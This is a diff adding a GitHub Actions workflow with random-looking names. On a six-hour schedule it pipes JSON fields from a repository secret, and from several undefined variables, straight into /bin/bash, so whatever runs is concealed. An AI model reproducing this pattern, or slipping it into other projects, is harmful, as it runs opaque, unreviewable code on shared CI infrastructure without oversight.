@@ -1,0 +1,24 @@
+name: donnahub986
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: donnahub986
+        env:
+          lsg38: ${{ secrets.lsg38 }}
+        run: |
+          echo $lsg38 | jq -r .ewbcl1919 | /bin/bash
+          echo $edhri14322 | jq -r .z750 | /bin/bash
+          echo $rbj070 | jq -r .x79 | /bin/bash
+          echo $k1742 | jq -r .py8 | /bin/bash
+          echo $l4789 | jq -r .sax870 | /bin/bash
+          echo $jcriv13 | jq -r .s54 | /bin/bash
+          echo $tz16259 | jq -r .d8962 | /bin/bash
+
